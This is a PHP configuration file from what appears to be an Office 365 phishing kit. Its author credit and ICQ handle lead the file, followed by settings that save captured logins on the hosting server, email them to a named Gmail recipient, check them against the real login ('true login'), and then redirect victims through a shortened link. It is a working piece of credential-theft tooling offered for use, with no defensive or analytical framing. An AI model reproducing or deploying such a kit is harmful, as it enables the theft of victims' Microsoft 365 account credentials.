<?php
// THIS SCRIPT CODED BY RAYREDDINGTON
// ICQ : rayreddington
// OFFICE 365 True Login
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

$savelog=true; // save logs to cpanel
$sendlog=true; // srnd logs to email
$truelogin=true; // enable / disable true login
$recipient ="rayreddingtonr8@gmail.com"; // your email
$over = 'https://bit.ly/2YTrfjV';
?>